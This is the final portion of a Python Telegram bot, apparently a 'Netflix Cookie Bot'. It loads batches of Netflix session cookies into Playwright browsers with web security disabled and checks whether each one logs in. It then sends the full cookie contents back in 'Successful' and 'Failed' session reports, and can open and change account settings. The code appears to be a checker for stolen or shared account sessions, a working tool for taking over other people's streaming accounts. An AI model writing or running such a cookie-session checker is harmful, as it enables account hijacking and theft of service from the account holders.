            # Add translate buttons to keyboard (max 3 per row for better layout)
            translate_row = []
            for i, button in enumerate(translate_buttons):
                translate_row.append(button)
                if len(translate_row) == 3 or i == len(translate_buttons) - 1:
                    keyboard.append(translate_row)
                    translate_row = []
        
        # Add close button
        keyboard.append([InlineKeyboardButton("❌ Close Sessions", callback_data="close_sessions")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        # Create status summary
        status_summary = f"🎬 Started from #{start_index + 1} - ✅ {len(valid_cookies)} | ❌ {len(invalid_cookies)} (auto-closed) | 🔗 {len(contexts)} windows open"
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=status_summary,
            reply_markup=reply_markup
        )
        
        # Generate failed sessions file if there are any failed sessions
        if failed_sessions_data:
            try:
                # Create temporary directory for the failed sessions file
                temp_dir = tempfile.mkdtemp()
                failed_sessions_filename = f"{len(failed_sessions_data)}x_Failed_Sessions.txt"
                failed_sessions_filepath = os.path.join(temp_dir, failed_sessions_filename)
                
                # Write failed sessions data to file
                with open(failed_sessions_filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Failed Sessions Report - Started from #{start_index + 1}\n")
                    f.write(f"Total Failed Sessions: {len(failed_sessions_data)}\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for failed_session in failed_sessions_data:
                        f.write(f"Original Index: {failed_session['original_index']}\n")
                        f.write(f"Session Name: {failed_session['name']}\n")
                        f.write(f"Error Type: {failed_session['error_type']}\n")
                        f.write(f"Session Content:\n{failed_session['content']}\n")
                        f.write("\n" + "=" * 50 + "\n\n")
                
                # Send the failed sessions file
                with open(failed_sessions_filepath, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=failed_sessions_filename,
                        caption=f"📄 Failed Sessions Report - Started from #{start_index + 1}\n❌ {len(failed_sessions_data)} failed sessions found"
                    )
                
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Error generating failed sessions file: {str(e)[:50]}..."
                )
        
        # Generate successful sessions file if there are any successful sessions
        if successful_sessions_data:
            try:
                # Create temporary directory for the successful sessions file
                temp_dir = tempfile.mkdtemp()
                successful_sessions_filename = f"{len(successful_sessions_data)}x_Successful_Sessions.txt"
                successful_sessions_filepath = os.path.join(temp_dir, successful_sessions_filename)
                
                # Write successful sessions data to file
                with open(successful_sessions_filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Successful Sessions Report - Started from #{start_index + 1}\n")
                    f.write(f"Total Successful Sessions: {len(successful_sessions_data)}\n")
                    f.write("=" * 50 + "\n\n")
                    
                    for successful_session in successful_sessions_data:
                        f.write(f"Original Index: {successful_session['original_index']}\n")
                        f.write(f"Session Name: {successful_session['name']}\n")
                        f.write(f"Status: {successful_session['status']}\n")
                        f.write(f"Session Content:\n{successful_session['content']}\n")
                        f.write("\n" + "=" * 50 + "\n\n")
                
                # Send the successful sessions file
                with open(successful_sessions_filepath, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=successful_sessions_filename,
                        caption=f"📄 Successful Sessions Report - Started from #{start_index + 1}\n✅ {len(successful_sessions_data)} successful sessions found"
                    )
                
                # Clean up temporary directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                    
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Error generating successful sessions file: {str(e)[:50]}..."
                )
        
        # Delete individual session messages after both TXT files are sent
        if session_message_ids:
            try:
                for msg_id in session_message_ids:
                    try:
                        await context.bot.delete_message(
                            chat_id=update.effective_chat.id,
                            message_id=msg_id
                        )
                    except Exception as e:
                        # Ignore errors if message is already deleted or not found
                        pass
            except Exception as e:
                # Ignore errors in bulk deletion
                pass
        
        # Delete the "Opening X cookies" message after both TXT files are sent
        try:
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=opening_msg.message_id
            )
        except Exception as e:
            # Ignore errors if message is already deleted or not found
            pass
        
        # IMPORTANT: DO NOT CLOSE BROWSER - Let user close manually
        # Browser will stay open until manually closed by user
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error in debug mode: {str(e)[:50]}..."
        )

async def handle_direct_netflix_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE, cookies_text: str):
    """Handle direct Netflix cookies sent in DM"""
    try:
        # Send processing message
        processing_msg = await update.message.reply_text("🎬 Processing direct Netflix cookies...")
        
        # Parse the cookies from tab-separated or space-separated format
        cookies = []
        lines = cookies_text.strip().split('\n')
        
        for line in lines:
            if line.strip() and ('.netflix.com' in line):
                # Try tab-separated first, then space-separated
                if '\t' in line:
                    parts = line.strip().split('\t')
                else:
                    # Split by spaces but handle multiple spaces
                    parts = line.strip().split()
                
                if len(parts) >= 7:
                    cookie = {
                        'name': parts[5],
                        'value': parts[6],
                        'domain': parts[0],
                        'path': parts[2]
                    }
                    cookies.append(cookie)
        
        # Remove duplicate cookies by name (keep the last one if duplicates exist)
        unique_cookies = {}
        for cookie in cookies:
            unique_cookies[cookie['name']] = cookie
        
        cookies = list(unique_cookies.values())
        
        if not cookies:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=processing_msg.message_id,
                text="❌ No valid Netflix cookies found in the message."
            )
            return
        
        # Create a single cookie data object for processing
        cookie_data = {
            'name': 'Direct_Netflix_Cookies',
            'content': cookies_text,
            'original_content': cookies_text
        }
        
        # Store the cookie data for potential future use
        context.user_data['direct_cookies'] = {
            'cookies': cookies,
            'cookie_data': cookie_data
        }
        
        # Update processing message
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=processing_msg.message_id,
            text=f"🎬 Found Netflix cookie set. Opening session..."
        )
        
        # Open the cookies in debug mode
        await open_single_cookie_in_debug_mode(cookie_data, update, context)
        
    except Exception as e:
        logger.error(f"Error handling direct Netflix cookies: {e}")
        await update.message.reply_text(f"❌ Error processing direct Netflix cookies: {str(e)}")

async def open_single_cookie_in_debug_mode(cookie_data, update, context):
    """Open a single cookie in debug mode"""
    try:
        # Launch browser with debug mode
        p = await async_playwright().start()
        
        # Try different browsers in order of preference
        browser = None
        browser_name = "Unknown"
        
        try:
            # Try Firefox first
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            browser_name = "Firefox"
        except Exception as e:
            logger.warning(f"Firefox launch failed: {e}")
            try:
                # Try Chromium as fallback
                browser = await p.chromium.launch(
                    headless=False,
                    slow_mo=1000,
                    args=[
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ]
                )
                browser_name = "Chromium"
            except Exception as e2:
                logger.warning(f"Chromium launch failed: {e2}")
                try:
                    # Try WebKit as last resort
                    browser = await p.webkit.launch(
                        headless=False,
                        slow_mo=1000
                    )
                    browser_name = "WebKit"
                except Exception as e3:
                    logger.error(f"All browser launches failed: {e3}")
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text="❌ Error: Could not launch any browser. Please install browser binaries using: python -m playwright install"
                    )
                    return
        
        if not browser:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error: No browser available. Please install browser binaries."
            )
            return
        
        # Create browser context and page
        context_instance = await browser.new_context(
            viewport={'width': 800, 'height': 600}
        )
        page = await context_instance.new_page()
        
        # Clear all storage data for fresh session
        await context_instance.clear_cookies()
        
        # Parse cookies
        cookies = []
        lines = cookie_data['content'].strip().split('\n')
        for line in lines:
            if line.strip() and ('.netflix.com' in line):
                # Try tab-separated first, then space-separated
                if '\t' in line:
                    parts = line.strip().split('\t')
                else:
                    # Split by spaces but handle multiple spaces
                    parts = line.strip().split()
                
                if len(parts) >= 7:
                    cookie = {
                        'name': parts[5],
                        'value': parts[6],
                        'domain': parts[0],
                        'path': parts[2]
                    }
                    cookies.append(cookie)
        
        if not cookies:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ No valid cookies found in the message."
            )
            return
        
        # Set cookies
        await context_instance.add_cookies(cookies)
        
        # Navigate to Netflix with retry mechanism
        max_retries = 3
        success = False
        
        for retry in range(max_retries):
            try:
                # Navigate to Netflix with different approaches
                try:
                    # First try: Navigate to main page (better for cookie-based auth)
                    await page.goto('https://www.netflix.com/in/', wait_until='domcontentloaded', timeout=30000)
                except:
                    # Second try: Direct navigation to login
                    await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                
                await page.wait_for_load_state('networkidle', timeout=30000)
                
                # Wait for redirect and check login status
                await page.wait_for_timeout(5000)
                current_url = page.url
                
                # Check for problematic URLs and handle them
                if ('vizdisplaycompositor' in current_url.lower() or 
                    'login?nextpage=' in current_url or 
                    'login?nextpage=' in current_url.lower()):
                            
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text="🔄 Detected problematic URL, redirecting to clean login page..."
                            )
                            
                            # Clear cookies and set them again
                            await context_instance.clear_cookies()
                            await context_instance.add_cookies(cookies)
                            
                            # Navigate directly to clean login URL
                            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
                            await page.wait_for_load_state('networkidle', timeout=30000)
                            await page.wait_for_timeout(5000)
                            current_url = page.url
                
                # Check for successful login with multiple indicators
                if ('/browse' in current_url or '/browser' in current_url or 'netflix.com/browse' in current_url or 
                    'netflix.com/in' in current_url and 'login' not in current_url.lower()):
                    # Navigate to account page
                    await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded', timeout=30000)
                    await page.wait_for_load_state('networkidle', timeout=30000)
                    
                    # Send success message with translate button
                    keyboard = [[InlineKeyboardButton("🌐 Translate to English", callback_data="translate_direct")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"✅ Direct Netflix Cookie Set - Success!",
                        reply_markup=reply_markup
                    )
                    
                    success = True
                    break
                else:
                    # Check if it's a login error page
                    if 'login' in current_url.lower() or 'signin' in current_url.lower():
                        if retry < max_retries - 1:
                            await page.wait_for_timeout(2000)
                            continue
                        else:
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text="❌ Direct Netflix Cookies - Failed after 3 attempts"
                            )
                            break
                    else:
                        # Unknown page, retry
                        if retry < max_retries - 1:
                            await page.wait_for_timeout(2000)
                            continue
                        else:
                            await context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text="❌ Direct Netflix Cookies - Page load failed"
                            )
                            break
                        
            except Exception as e:
                if retry < max_retries - 1:
                    await page.wait_for_timeout(2000)
                    continue
                else:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"❌ Direct Netflix Cookies - Error: {str(e)[:50]}..."
                    )
                    break
        
        # Store browser reference to prevent garbage collection
        chat_id = update.effective_chat.id
        active_browsers[chat_id] = {
            'browser': browser,
            'playwright': p,
            'contexts': [context_instance],
            'pages': [page]
        }
        
        # Send completion message with close button
        keyboard = [[InlineKeyboardButton("❌ Close Session", callback_data="close_sessions")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        status_summary = f"🎬 Direct Netflix Cookie Set - ✅ Success | 🔗 1 window open"
        
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=status_summary,
            reply_markup=reply_markup
        )
        
        # IMPORTANT: DO NOT CLOSE BROWSER - Let user close manually
        # Browser will stay open until manually closed by user
        
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ Error in debug mode: {str(e)[:50]}..."
        )

async def translate_direct_session_to_english(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Translate direct session to English"""
    query = update.callback_query
    
    try:
        await query.answer()
        await query.edit_message_text("🌐 Translating Direct Session to English...")
        
        # Get the stored direct cookies data from context
        if 'direct_cookies' in context.user_data:
            direct_data = context.user_data['direct_cookies']
            cookie_data = direct_data['cookie_data']
            await perform_translate_direct_to_english(update, context, cookie_data)
        else:
            await query.edit_message_text("❌ Error: No direct cookies data found. Please send the cookies again.")
            
    except Exception as e:
        logger.error(f"Error in translate direct session: {e}")
        await query.edit_message_text(f"❌ Error during translate: {str(e)[:50]}...")

async def perform_translate_direct_to_english(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_data):
    """Perform the actual translation to English for direct cookies"""
    query = update.callback_query
    
    try:
        async with async_playwright() as p:
            # Launch Firefox browser
            browser = await p.firefox.launch(
                headless=False,
                slow_mo=1000,
                args=[
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
                ]
            )
            
            context_instance = await browser.new_context(
                viewport={'width': 800, 'height': 600}
            )
            page = await context_instance.new_page()
            
            # Clear all storage data for fresh session
            await context_instance.clear_cookies()
            
            # Parse cookies
            cookies = []
            lines = cookie_data['content'].strip().split('\n')
            for line in lines:
                if line.strip() and ('.netflix.com' in line):
                    # Try tab-separated first, then space-separated
                    if '\t' in line:
                        parts = line.strip().split('\t')
                    else:
                        # Split by spaces but handle multiple spaces
                        parts = line.strip().split()
                    
                    if len(parts) >= 7:
                        cookie = {
                            'name': parts[5],
                            'value': parts[6],
                            'domain': parts[0],
                            'path': parts[2]
                        }
                        cookies.append(cookie)
            
            # Set cookies
            await context_instance.add_cookies(cookies)
            
            # Navigate to Netflix
            await page.goto('https://www.netflix.com/in/login', wait_until='domcontentloaded', timeout=30000)
            await page.wait_for_load_state('networkidle', timeout=30000)
            await page.wait_for_timeout(5000)
            
            # Check if login successful
            current_url = page.url
            if '/browse' in current_url or '/browser' in current_url:
                # Navigate to account profiles
                await page.goto('https://www.netflix.com/account/profiles', wait_until='domcontentloaded', timeout=30000)
                await page.wait_for_load_state('networkidle', timeout=30000)
                await page.wait_for_timeout(3000)
                
                # Try to find and click language settings
                try:
                    # Look for language/locale settings
                    await page.goto('https://www.netflix.com/in/account', wait_until='domcontentloaded', timeout=30000)
                    await page.wait_for_load_state('networkidle', timeout=30000)
                    await page.wait_for_timeout(3000)
                    
                    # Try to find language settings link
                    language_links = await page.query_selector_all('a[href*="language"], a[href*="locale"], a[href*="region"]')
                    
                    if language_links:
                        await language_links[0].click()
                        await page.wait_for_load_state('networkidle', timeout=30000)
                        await page.wait_for_timeout(3000)
                        
                        # Look for English option
                        english_options = await page.query_selector_all('input[value*="en"], input[value*="English"], option[value*="en"]')
                        
                        if english_options:
                            await english_options[0].click()
                            await page.wait_for_timeout(2000)
                            
                            # Look for save button
                            save_buttons = await page.query_selector_all('button[type="submit"], input[type="submit"], button:has-text("Save"), button:has-text("Update")')
                            
                            if save_buttons:
                                await save_buttons[0].click()
                                await page.wait_for_load_state('networkidle', timeout=30000)
                                await page.wait_for_timeout(3000)
                                
                                await query.edit_message_text("✅ Direct Session translated to English successfully!")
                            else:
                                await query.edit_message_text("⚠️ Language changed but could not find save button.")
                        else:
                            await query.edit_message_text("⚠️ Could not find English language option.")
                    else:
                        await query.edit_message_text("⚠️ Could not find language settings. Manual intervention may be required.")
                        
                except Exception as e:
                    await query.edit_message_text(f"⚠️ Error during translation: {str(e)[:50]}...")
            else:
                await query.edit_message_text("❌ Login failed - cannot translate language.")
            
            # Keep browser open for manual inspection
            await page.wait_for_timeout(10000)
            
    except Exception as e:
        await query.edit_message_text(f"❌ Error during translation: {str(e)[:50]}...")

def main():
    """Start the bot"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start the bot
    print("�� Netflix Cookie Bot is starting...")
    print("📝 Send a ZIP file with Netflix cookies, a TXT file for analysis, or a Netflix ID message to get started!")
    application.run_polling()
    
if __name__ == '__main__':
    main() 